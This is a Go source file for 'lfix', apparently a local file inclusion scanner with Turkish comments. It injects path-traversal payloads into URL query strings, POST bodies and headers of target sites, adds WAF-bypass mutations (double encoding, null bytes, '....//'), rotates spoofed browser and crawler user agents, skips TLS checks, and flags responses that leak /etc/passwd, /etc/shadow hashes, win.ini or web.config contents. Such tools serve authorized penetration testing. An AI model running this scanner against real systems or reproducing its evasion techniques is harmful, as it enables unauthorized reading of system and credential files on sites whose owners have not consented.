package main

import (
	"bufio"
	"crypto/tls"
	_ "embed"
	"encoding/base64"
	"flag"
	"fmt"
	"io"
	"math/rand"
	"net/http"
	"net/url"
	"os"
	"regexp"
	"strings"
	"sync"
	"time"
)

//go:embed payload.txt
var embeddedPayloads string

// --- PROJE SABİTLERİ ---

const (
	AppName    = "lfix"
	Version    = "1.0.0"
	Author     = "Security Researcher"
	TimeFormat = "15:04:05"
)

// Renk Kodları (Terminal Çıktısı İçin)
const (
	ColorReset  = "\033[0m"
	ColorRed    = "\033[31m"
	ColorGreen  = "\033[32m"
	ColorYellow = "\033[33m"
	ColorCyan   = "\033[36m"
	ColorBlue   = "\033[34m"
	ColorGrey   = "\033[90m"
)

// --- İMZALAR (SIGNATURES) ---
// Her kategori için spesifik ve güvenilir imzalar
// Genel kelimeler (extensions, fonts vb.) false positive yarattığı için çıkarıldı

var signatures = []string{
	// 1. LINUX /etc/passwd (Kesin belirtiler - 2+ eşleşme gerekli)
	"root:x:0:0:",       // Root user - en güvenilir
	"daemon:x:1:1:",     // Daemon user
	"www-data:x:33:33:", // Apache user
	"nobody:x:65534:",   // Nobody user

	// 2. LINUX /etc/shadow (Hash formatları)
	"root:$6$", // SHA-512 hash
	"root:$5$", // SHA-256 hash
	"root:$1$", // MD5 hash
	"root:!:",  // Locked account
	"root:*:",  // Disabled password

	// 3. WINDOWS boot.ini
	"[boot loader]",
	"multi(0)disk(0)rdisk(0)partition",

	// 4. WINDOWS win.ini
	"for 16-bit app support",

	// 5. WINDOWS system.ini
	"[drivers]",
	"[mci]",
	"wave=mmdrv.dll",

	// 6. IIS web.config
	"<configuration>",
	"<system.webServer>",
	"<connectionStrings>",

	// 7. PHP HATA MESAJLARI (Kesin LFI belirtisi - 1 yeterli)
	"Warning: include(",
	"Warning: require(",
	"failed to open stream: No such file",
	"Failed opening required",

	// 8. JAVA / TOMCAT (web.xml içeriği)
	"<servlet-class>",
	"<servlet-mapping>",
}

// --- USER AGENT HAVUZU ---
var userAgents = []string{
	"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
	"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.114 Safari/537.36",
	"Mozilla/5.0 (X11; Linux x86_64; rv:89.0) Gecko/20100101 Firefox/89.0",
	"Mozilla/5.0 (iPhone; CPU iPhone OS 14_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0 Mobile/15E148 Safari/604.1",
	"Mozilla/5.0 (Linux; Android 11; SM-G991B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.120 Mobile Safari/537.36",
	"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Edge/91.0.864.59",
	"Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)",
	"Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:88.0) Gecko/20100101 Firefox/88.0",
	"Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.101 Safari/537.36",
	"Mozilla/5.0 (iPad; CPU OS 14_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0 Mobile/15E148 Safari/604.1",
	"Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko",
	"Mozilla/5.0 (X11; Fedora; Linux x86_64; rv:87.0) Gecko/20100101 Firefox/87.0",
	"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:78.0) Gecko/20100101 Firefox/78.0",
	"Mozilla/5.0 (Linux; Android 10; SM-A505FN) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.120 Mobile Safari/537.36",
	"Mozilla/5.0 (Macintosh; Intel Mac OS X 10.14; rv:89.0) Gecko/20100101 Firefox/89.0",
	"Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.93 Safari/537.36",
	"Mozilla/5.0 (X11; CrOS x86_64 13904.77.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.114 Safari/537.36",
	"Mozilla/5.0 (compatible; Bingbot/2.0; +http://www.bing.com/bingbot.htm)",
	"Mozilla/5.0 (Linux; Android 10; SM-G975F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.120 Mobile Safari/537.36",
	"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.82 Safari/537.36",
	"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.77 Safari/537.36",
	"Mozilla/5.0 (iPhone; CPU iPhone OS 13_2_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.0.3 Mobile/15E148 Safari/604.1",
	"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.1 Safari/605.1.15",
	"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.131 Safari/537.36",
	"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.114 Safari/537.36",
	"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:89.0) Gecko/20100101 Firefox/89.0",
	"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.212 Safari/537.36",
	"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
	"DuckDuckBot/1.0; (+http://duckduckgo.com/duckduckbot.html)",
	"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.159 Safari/537.36",
}

// Base64 Regex (Derlenmiş)
var base64Regex = regexp.MustCompile(`([A-Za-z0-9+/]{20,})={0,2}`)

// --- DATA STRUCTS ---

type Options struct {
	SingleURL    string
	ListFile     string
	PayloadFile  string
	OutputFile   string
	PostData     string
	Method       string
	TargetHeader string
	StaticHeader string
	Proxy        string
	Concurrency  int
	Timeout      int
	Verbose      bool
	Debug        bool
	UseMutation  bool
	Calibrate    bool
}

type Task struct {
	URL            string
	Method         string
	PostData       string
	Headers        map[string]string
	Payload        string
	InjectionPoint string
}

type Scanner struct {
	Client        *http.Client
	Options       Options
	Output        *os.File
	BaselineCache sync.Map // URL -> baseline response body
}

// --- MAIN FUNCTION ---

func main() {
	printBanner()
	rand.Seed(time.Now().UnixNano())

	// 1. Bayrakları (Flags) Oku
	opts := parseFlags()

	// 2. Çıktı Dosyasını Hazırla (Varsa)
	var outFile *os.File
	if opts.OutputFile != "" {
		f, err := os.OpenFile(opts.OutputFile, os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0644)
		if err != nil {
			logError("Dosya hatası: %v", err)
			return
		}
		outFile = f
		defer outFile.Close()
	}

	// 3. Tarayıcıyı Başlat
	scanner := NewScanner(opts, outFile)

	// 4. Hedefleri Yükle (Fix burada)
	urls := loadTargets(opts)
	payloads := loadPayloads(opts.PayloadFile)

	if len(urls) == 0 {
		logError("Lütfen bir hedef belirtin (-u veya -l)")
		os.Exit(1)
	}

	fmt.Printf("%s[+] Mod: %s | Workers: %d | Targets: %d | Payloads: %d%s\n",
		ColorCyan, opts.Method, opts.Concurrency, len(urls), len(payloads), ColorReset)

	// 5. Taramayı Ateşle
	scanner.Start(urls, payloads)
}

// --- SCANNER ENGINE ---

func NewScanner(opts Options, outFile *os.File) *Scanner {
	// TLS ve Proxy Ayarları
	transport := &http.Transport{
		TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
	}
	if opts.Proxy != "" {
		proxyURL, _ := url.Parse(opts.Proxy)
		transport.Proxy = http.ProxyURL(proxyURL)
	}

	client := &http.Client{
		Transport: transport,
		Timeout:   time.Duration(opts.Timeout) * time.Second,
		CheckRedirect: func(req *http.Request, via []*http.Request) error {
			return http.ErrUseLastResponse // Redirect takip etme
		},
	}

	return &Scanner{Client: client, Options: opts, Output: outFile}
}

func (s *Scanner) Start(urls []string, payloads []string) {
	tasks := make(chan Task, 2000)
	var wg sync.WaitGroup

	// Workerları Başlat
	for i := 0; i < s.Options.Concurrency; i++ {
		wg.Add(1)
		go s.worker(tasks, &wg)
	}

	// İş Dağıtıcısı (Dispatcher)
	go func() {
		for _, target := range urls {
			s.generateTasks(target, payloads, tasks)
		}
		close(tasks)
	}()

	wg.Wait()
	fmt.Println("\n" + ColorGreen + "[+] Tarama Tamamlandı." + ColorReset)
}

func (s *Scanner) generateTasks(target string, payloads []string, tasks chan<- Task) {
	// 0. Temizlik: Backslash temizliği (ekstra güvenlik)
	target = strings.ReplaceAll(target, "\\", "")

	// FUZZ anahtar kelimesi var mı?
	hasFuzz := strings.Contains(target, "FUZZ") ||
		strings.Contains(s.Options.PostData, "FUZZ") ||
		strings.Contains(s.Options.TargetHeader, "FUZZ")

	staticHeaders := parseHeaderString(s.Options.StaticHeader)

	for _, rawPayload := range payloads {
		// WAF Bypass Varyasyonlarını Üret
		mutations := []string{rawPayload}
		if s.Options.UseMutation {
			mutations = getMutations(rawPayload)
		}

		for _, payload := range mutations {
			// SENARYO 1: Manuel FUZZ Modu (Nokta Atışı)
			if hasFuzz {
				finalURL := strings.ReplaceAll(target, "FUZZ", payload)
				finalPost := strings.ReplaceAll(s.Options.PostData, "FUZZ", payload)

				headers := copyMap(staticHeaders)
				// Eğer headerda FUZZ varsa onu da değiştir
				if s.Options.TargetHeader != "" {
					parts := strings.SplitN(s.Options.TargetHeader, ":", 2)
					if len(parts) == 2 {
						k := strings.TrimSpace(parts[0])
						v := strings.TrimSpace(parts[1])
						headers[k] = strings.ReplaceAll(v, "FUZZ", payload)
					}
				}

				tasks <- Task{
					URL: finalURL, Method: s.Options.Method, PostData: finalPost,
					Headers: headers, Payload: payload, InjectionPoint: "CUSTOM_FUZZ",
				}
				continue
			}

			// SENARYO 2: Otomatik Keşif Modu (Manuel Build)
			u, err := url.Parse(target)
			if err != nil {
				if s.Options.Verbose {
					logError("URL Parse Hatası: %s", target)
				}
				continue
			}

			// A. URL Query Parametreleri
			queryParams := u.Query()
			for attackParam := range queryParams {

				var queryStringParts []string

				for key, values := range queryParams {
					if key == attackParam {
						// SALDIRI NOKTASI: Payload'ı HAM (Raw) olarak ekle
						queryStringParts = append(queryStringParts, fmt.Sprintf("%s=%s", key, payload))
					} else {
						// DİĞER NOKTALAR: Eski değerleri koru ve GÜVENLİ şekilde encode et
						for _, val := range values {
							queryStringParts = append(queryStringParts, fmt.Sprintf("%s=%s", key, url.QueryEscape(val)))
						}
					}
				}

				uClone := *u
				uClone.RawQuery = strings.Join(queryStringParts, "&")

				tasks <- Task{
					URL: uClone.String(), Method: s.Options.Method, PostData: s.Options.PostData,
					Headers: staticHeaders, Payload: payload, InjectionPoint: "URL_" + attackParam,
				}
			}

			// B. POST Parametreleri
			if s.Options.Method == "POST" && s.Options.PostData != "" {
				postParams, err := url.ParseQuery(s.Options.PostData)
				if err == nil {
					for attackParam := range postParams {
						var postBodyParts []string
						for key, values := range postParams {
							if key == attackParam {
								postBodyParts = append(postBodyParts, fmt.Sprintf("%s=%s", key, payload))
							} else {
								for _, val := range values {
									postBodyParts = append(postBodyParts, fmt.Sprintf("%s=%s", key, url.QueryEscape(val)))
								}
							}
						}
						newPostData := strings.Join(postBodyParts, "&")
						tasks <- Task{
							URL: target, Method: "POST", PostData: newPostData,
							Headers: staticHeaders, Payload: payload, InjectionPoint: "POST_" + attackParam,
						}
					}
				}
			}

			// C. Header Injection
			if s.Options.TargetHeader != "" {
				cleanKey := strings.TrimSpace(strings.ReplaceAll(s.Options.TargetHeader, ":", ""))
				h := copyMap(staticHeaders)
				h[cleanKey] = payload
				tasks <- Task{
					URL: target, Method: s.Options.Method, PostData: s.Options.PostData,
					Headers: h, Payload: payload, InjectionPoint: "HEADER_" + cleanKey,
				}
			}
		}
	}
}

func (s *Scanner) worker(tasks <-chan Task, wg *sync.WaitGroup) {
	defer wg.Done()
	for task := range tasks {
		if s.Options.Debug {
			logDebug("[%s] %s", task.InjectionPoint, task.URL)
		}

		// Auto-Calibration: Baseline al
		var baselineBody string
		if s.Options.Calibrate {
			baselineBody = s.getBaseline(task)
		}

		req, err := http.NewRequest(task.Method, task.URL, strings.NewReader(task.PostData))
		if err != nil {
			continue
		}

		// User-Agent: Rastgele Seç
		if len(userAgents) > 0 {
			req.Header.Set("User-Agent", userAgents[rand.Intn(len(userAgents))])
		}

		// POST data form-encoded kontrolü
		if task.Method == "POST" && !strings.Contains(task.PostData, "{") {
			req.Header.Set("Content-Type", "application/x-www-form-urlencoded")
		}

		// Headerları Ekle
		for k, v := range task.Headers {
			req.Header.Set(k, v)
		}

		resp, err := s.Client.Do(req)
		if err != nil {
			continue
		}

		body, err := io.ReadAll(resp.Body)
		resp.Body.Close()
		if err != nil {
			continue
		}

		s.analyze(string(body), baselineBody, task)
	}
}

// getBaseline: Orijinal URL'nin response'unu al (cache'li)
func (s *Scanner) getBaseline(task Task) string {
	// URL'den base key oluştur (payload olmadan)
	u, err := url.Parse(task.URL)
	if err != nil {
		return ""
	}
	baseKey := u.Scheme + "://" + u.Host + u.Path

	// Cache'de var mı?
	if cached, ok := s.BaselineCache.Load(baseKey); ok {
		return cached.(string)
	}

	// Yoksa baseline isteği yap
	req, err := http.NewRequest(task.Method, baseKey, nil)
	if err != nil {
		return ""
	}

	if len(userAgents) > 0 {
		req.Header.Set("User-Agent", userAgents[rand.Intn(len(userAgents))])
	}

	resp, err := s.Client.Do(req)
	if err != nil {
		s.BaselineCache.Store(baseKey, "")
		return ""
	}
	defer resp.Body.Close()

	body, err := io.ReadAll(resp.Body)
	if err != nil {
		s.BaselineCache.Store(baseKey, "")
		return ""
	}

	baselineStr := string(body)
	s.BaselineCache.Store(baseKey, baselineStr)

	if s.Options.Debug {
		logDebug("[BASELINE] %s (%d bytes)", baseKey, len(baselineStr))
	}

	return baselineStr
}

// Payload kategorisine göre aranacak imzalar (optimize edilmiş)
var payloadSignatureMap = map[string][]string{
	"passwd": {
		"root:x:0:0:",
		"daemon:x:1:1:",
		"www-data:x:33:33:",
		"nobody:x:65534:",
	},
	"shadow": {
		"root:$6$",
		"root:$5$",
		"root:$1$",
		"root:!:",
		"root:*:",
	},
	"boot.ini": {
		"[boot loader]",
		"multi(0)disk(0)rdisk(0)partition",
	},
	"win.ini": {
		"for 16-bit app support",
	},
	"system.ini": {
		"[drivers]",
		"[mci]",
		"wave=mmdrv.dll",
	},
	"web_config": {
		"<configuration>",
		"<system.webServer>",
		"<connectionStrings>",
	},
	"php_error": {
		"Warning: include(",
		"Warning: require(",
		"failed to open stream: No such file",
		"Failed opening required",
	},
	"web_xml": {
		"<servlet-class>",
		"<servlet-mapping>",
	},
}

// Payload'dan kategori belirle
func getPayloadCategory(payload string) string {
	payloadLower := strings.ToLower(payload)

	if strings.Contains(payloadLower, "passwd") {
		return "passwd"
	}
	if strings.Contains(payloadLower, "shadow") {
		return "shadow"
	}
	if strings.Contains(payloadLower, "boot.ini") {
		return "boot.ini"
	}
	if strings.Contains(payloadLower, "win.ini") {
		return "win.ini"
	}
	if strings.Contains(payloadLower, "system.ini") {
		return "system.ini"
	}
	if strings.Contains(payloadLower, "web.config") {
		return "web_config"
	}
	if strings.Contains(payloadLower, "web.xml") || strings.Contains(payloadLower, "web-inf") {
		return "web_xml"
	}

	return "" // Bilinmeyen kategori
}

func (s *Scanner) analyze(body string, baseline string, task Task) {
	// Minimum güvenilirlik için gereken imza sayısı
	const minMatchesRequired = 2 // Tek eşleşme yeterli DEĞİL

	found := false
	matchInfo := ""
	matchCount := 0
	var matchedSignatures []string

	// 1. Payload kategorisine göre hedefli arama yap
	category := getPayloadCategory(task.Payload)
	var targetSignatures []string

	if category != "" && len(payloadSignatureMap[category]) > 0 {
		// Spesifik kategori - sadece ilgili imzaları ara
		targetSignatures = payloadSignatureMap[category]
	} else {
		// Bilinmeyen kategori - tüm imzaları ara ama daha yüksek eşik
		targetSignatures = signatures
	}

	// 2. İmza kontrolü (Plaintext) - Calibration ile
	for _, sig := range targetSignatures {
		if strings.Contains(body, sig) {
			// AUTO-CALIBRATION: İmza baseline'da da var mı?
			if baseline != "" && strings.Contains(baseline, sig) {
				// İmza zaten orijinal response'da var - FALSE POSITIVE
				if s.Options.Debug {
					logDebug("[CALIBRATION] Skipping '%s' - exists in baseline", sig)
				}
				continue
			}
			matchCount++
			matchedSignatures = append(matchedSignatures, sig)
		}
	}

	// 3. Base64 Decode Kontrol (sadece henüz yeterli eşleşme yoksa)
	if matchCount < minMatchesRequired {
		matches := base64Regex.FindAllString(body, -1)
		for _, m := range matches {
			decodedBytes, err := base64.StdEncoding.DecodeString(m)
			if err == nil {
				decodedStr := string(decodedBytes)
				for _, sig := range targetSignatures {
					if strings.Contains(decodedStr, sig) {
						// Baseline kontrolü base64 için de
						if baseline != "" && strings.Contains(baseline, sig) {
							continue
						}
						matchCount++
						matchedSignatures = append(matchedSignatures, "BASE64:"+sig)
					}
				}
			}
		}
	}

	// 4. Sonuç değerlendirme
	// Passwd/shadow gibi güvenilir dosyalar için 2+ imza gerekli
	// PHP hataları gibi kesin belirtiler için 1 yeterli
	requiredMatches := minMatchesRequired
	if category == "php_error" || category == "web_config" {
		requiredMatches = 1 // PHP hata mesajları ve web.config kesin belirtisi
	}

	if matchCount >= requiredMatches {
		found = true
		if len(matchedSignatures) > 0 {
			matchInfo = fmt.Sprintf("%d matches: %s", matchCount, strings.Join(matchedSignatures, ", "))
		}
	}

	if found {
		s.reportVuln(task, matchInfo)
	} else if matchCount > 0 && s.Options.Verbose {
		// Yetersiz eşleşme - uyarı göster
		fmt.Printf("%s[WEAK] %s (only %d match, need %d)%s\n", ColorYellow, task.URL, matchCount, requiredMatches, ColorReset)
	} else if s.Options.Verbose {
		fmt.Printf("%s[SAFE] %s%s\n", ColorGrey, task.URL, ColorReset)
	}
}

func (s *Scanner) reportVuln(task Task, match string) {
	output := fmt.Sprintf("%s[VULN] [%s] Found: %s\n    URL: %s\n    Payload: %s%s",
		ColorRed, task.InjectionPoint, match, task.URL, task.Payload, ColorReset)

	fmt.Println("\n" + output)

	if s.Output != nil {
		s.Output.WriteString(fmt.Sprintf("[%s] TYPE: %s | URL: %s | PAYLOAD: %s | MATCH: %s\n",
			time.Now().Format(TimeFormat), task.InjectionPoint, task.URL, task.Payload, match))
	}
}

// --- YARDIMCI FONKSİYONLAR ---

// URL içindeki ters eğik çizgileri temizler
func sanitizeURL(rawURL string) string {
	return strings.ReplaceAll(rawURL, "\\", "")
}

func parseFlags() Options {
	o := Options{}
	flag.StringVar(&o.SingleURL, "u", "", "Tek hedef URL")
	flag.StringVar(&o.ListFile, "l", "", "Hedef listesi")
	flag.StringVar(&o.PayloadFile, "p", "", "Payload dosyası")
	flag.StringVar(&o.OutputFile, "o", "", "Çıktı dosyası")
	flag.StringVar(&o.PostData, "data", "", "POST Body")
	flag.StringVar(&o.Method, "X", "GET", "HTTP Metodu")
	flag.StringVar(&o.TargetHeader, "H", "", "Saldırılacak Header")
	flag.StringVar(&o.StaticHeader, "header", "", "Sabit Header")
	flag.StringVar(&o.Proxy, "proxy", "", "Proxy")
	flag.IntVar(&o.Concurrency, "c", 30, "Worker")
	flag.IntVar(&o.Timeout, "t", 7, "Timeout")
	flag.BoolVar(&o.Verbose, "v", false, "Verbose")
	flag.BoolVar(&o.Debug, "debug", false, "Debug")
	flag.BoolVar(&o.UseMutation, "mutate", true, "Mutasyon")
	flag.BoolVar(&o.Calibrate, "calibrate", true, "Auto-Calibration (baseline karşılaştırma)")
	flag.Parse()
	return o
}

func loadTargets(opts Options) []string {
	var urls []string

	if opts.SingleURL != "" {
		urls = append(urls, sanitizeURL(opts.SingleURL))
	} else {
		var scanner *bufio.Scanner
		if opts.ListFile != "" {
			f, err := os.OpenFile(opts.ListFile, os.O_RDONLY, 0)
			if err != nil {
				return urls
			}
			defer f.Close()
			scanner = bufio.NewScanner(f)
		} else {
			stat, _ := os.Stdin.Stat()
			if (stat.Mode() & os.ModeCharDevice) == 0 {
				scanner = bufio.NewScanner(os.Stdin)
			} else {
				return urls
			}
		}
		for scanner.Scan() {
			t := strings.TrimSpace(scanner.Text())
			if t != "" {
				urls = append(urls, sanitizeURL(t))
			}
		}
	}
	return urls
}

func loadPayloads(filename string) []string {
	// Kullanıcı özel payload dosyası belirttiyse onu kullan
	if filename != "" {
		var p []string
		f, err := os.Open(filename)
		if err != nil {
			logError("Payload dosyası açılamadı: %v", err)
			return p
		}
		defer f.Close()

		scanner := bufio.NewScanner(f)
		for scanner.Scan() {
			t := strings.TrimSpace(scanner.Text())
			if t != "" {
				p = append(p, t)
			}
		}
		return p
	}

	// Kullanıcı dosya belirtmediyse gömülü payload'ları kullan
	var p []string
	scanner := bufio.NewScanner(strings.NewReader(embeddedPayloads))
	for scanner.Scan() {
		t := strings.TrimSpace(scanner.Text())
		if t != "" {
			p = append(p, t)
		}
	}
	return p
}

func getMutations(payload string) []string {
	// WAF Bypass Teknikleri
	return []string{
		payload,                  // Orijinal
		url.QueryEscape(payload), // URL Encode
		url.QueryEscape(url.QueryEscape(payload)), // Double Encode
		payload + "%00", // Null Byte
		strings.ReplaceAll(payload, "../", "....//"), // Path Filter Bypass
	}
}

func parseHeaderString(h string) map[string]string {
	m := make(map[string]string)
	if h != "" {
		parts := strings.SplitN(h, ":", 2)
		if len(parts) == 2 {
			m[strings.TrimSpace(parts[0])] = strings.TrimSpace(parts[1])
		}
	}
	return m
}

func copyMap(original map[string]string) map[string]string {
	c := make(map[string]string)
	for k, v := range original {
		c[k] = v
	}
	return c
}

func logError(format string, a ...interface{}) {
	fmt.Printf(ColorRed+"[!] "+format+ColorReset+"\n", a...)
}

func logDebug(format string, a ...interface{}) {
	fmt.Printf(ColorBlue+"[DEBUG] "+format+ColorReset+"\n", a...)
}

func printBanner() {
	fmt.Println(ColorCyan + `
  ██╗     ███████╗██╗██╗  ██╗
  ██║     ██╔════╝██║╚██╗██╔╝
  ██║     █████╗  ██║ ╚███╔╝ 
  ██║     ██╔══╝  ██║ ██╔██╗ 
  ███████╗██║     ██║██╔╝ ██╗
  ╚══════╝╚═╝     ╚═╝╚═╝  ╚═╝
  ` + AppName + ` v` + Version + ` - Advanced LFI Scanner
` + ColorReset)
}
